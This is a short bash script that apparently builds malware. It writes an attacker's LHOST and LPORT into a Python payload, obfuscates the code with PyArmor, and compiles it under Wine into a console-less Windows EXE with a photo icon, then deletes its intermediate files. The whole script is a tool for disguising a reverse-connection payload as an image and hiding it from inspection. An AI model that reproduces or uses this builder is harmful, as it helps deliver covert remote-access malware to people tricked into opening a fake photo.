#!/bin/bash

set -e

if [ -z "$3" ]; then
  echo "Usage: ./build_py.sh <file.py> <LHOST> <LPORT>"
  exit 1
fi

FILE="$1"
LHOST="$2"
LPORT="$3"

NAME=$(basename "$FILE" .py)

OBF_DIR="obf_$NAME"
PATCHED="patched_$NAME.py"

echo "[1] Cleanup old files..."
rm -rf build dist "$OBF_DIR" *.spec "$PATCHED"

echo "[2] Create patched source (compile-time values)..."

cp "$FILE" "$PATCHED"

# hard inject values (compile-time)
sed -i "s/os.environ.get(\"LHOST\") or \".*\"/\"$LHOST\"/" "$PATCHED"
sed -i "s/os.environ.get(\"LPORT\") or \".*\"/\"$LPORT\"/" "$PATCHED"

echo "[3] PyArmor obfuscation..."

wine cmd /c "pyarmor gen -O $OBF_DIR $PATCHED"

echo "[4] Find entry file..."

ENTRY=$(find "$OBF_DIR" -name "*.py" | head -n 1)

echo "Entry: $ENTRY"

echo "[5] Build EXE with PyInstaller..."

cd "$OBF_DIR"

cp "../photo.ico" "photo.ico"

wine cmd /c "chcp 65001 > nul && pyinstaller --onefile --icon=photo.ico --noconsole $(basename $ENTRY)"

cd ..

echo "[6] Collect result..."

mkdir -p dist

EXE=$(find "$OBF_DIR/dist" -name "*.exe" | head -n 1)

cp "$EXE" "dist/$NAME.exe"

echo "[7] DONE -> dist/$NAME.exe"

echo "[8] Cleanup..."

rm -rf build
rm -f *.spec
rm -f patched_*.py
rm -rf obf_*
